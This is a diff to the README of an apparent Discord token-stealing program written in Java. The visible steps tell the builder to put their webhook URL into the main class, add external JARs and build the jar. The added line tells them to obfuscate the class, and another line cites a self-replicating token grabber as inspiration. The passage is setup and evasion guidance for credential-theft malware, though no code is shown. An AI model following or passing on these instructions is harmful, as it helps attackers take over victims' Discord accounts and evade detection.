@@ -13,5 +13,6 @@
 4. Open Main Class Go to [line 26](https://github.com/RustyBalboadev/Token-Grabber/blob/master/TokenGrabber/src/Main.java#L24) and put your Webhook URL there.
 5. Add external JARs to the program [here](https://github.com/RustyBalboadev/Token-Grabber/tree/master/TokenGrabber/External%20JARS)
 5. Build Jar and Enjoy
+# ⚠️ I Highly Suggest You Obfuscate Your Class! ⚠️
 # Inspiration 🧠
 This Program Was Extremely Inspired by [Sheepy1337](https://github.com/Sheepy1337)'s Program [Genesis Self Replicating Discord Token Grabber](https://github.com/Sheepy1337/-Genesis-Self-Replicating-Discord-Token-Grabber)
